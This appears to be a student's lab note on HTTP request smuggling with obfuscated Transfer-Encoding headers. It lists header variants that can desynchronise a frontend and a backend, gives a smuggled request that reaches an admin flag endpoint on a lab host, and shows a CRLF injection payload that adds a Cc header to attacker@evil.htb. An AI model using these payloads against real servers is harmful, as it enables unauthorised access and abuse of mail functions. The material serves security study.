**Transfer-Encoding.Transfer-Encoding Attack**
This type of attack happens when both frontend & backend(reverseproxy&webserver) both supports chunked mode but one of them doesn't parse the chunks correctly and this can cause some desincronzations.

## How to identify?
Send the TE header obfuscated in order to find who(back or fronted) fails to read correctly the TE header and cause a miss-match to a disconnect. Example some systems might check only if "chunked" exist in the TE header and some other might need a exact match.
```
Substring match 	                    Transfer-Encoding: testchunked
Space in Header name 	                Transfer-Encoding : chunked
Horizontal Tab Separator 	            Transfer-Encoding:0x09chunked
Vertical Tab Separator 	                Transfer-Encoding:0x0bchunked
Leading space 	                        Transfer-Encoding: chunked
```
Try all of those payloads and send in succession 2 request untill you find with payload works to make one of 2 systems fail to parse the TE header. Use the HEX editor in Burp to input hex values in the request for horizontal and vertical separator.


## Exploitation
This attack is time sensitive so you might need to send the request manually every second until the victim fails the bait, since the request need to come just a second before you send the request. In this case we can use the same payload:
```
POST / HTTP/1.1
Host: tete.htb
Content-Length: 46
Transfer-Encoding:	chunked

0

GET /admin?reveal_flag=1 HTTP/1.1
Dummy:

```
OBS: if it's a POST request in the smuggled you might need to add the **Content-Type: application/x-www-form-urlencoded** header and the **Content-Length** header as well.
```
POST /contact HTTP/1.1
Host: 83.136.253.251:54607
Content-Length: 101
Content-Type: application/x-www-form-urlencoded

name=hacker%0d%0aCc:%20attacker%40evil.htb%0d%0aDummy:%20test&email=attacker%40evil.htb&message=Hello
```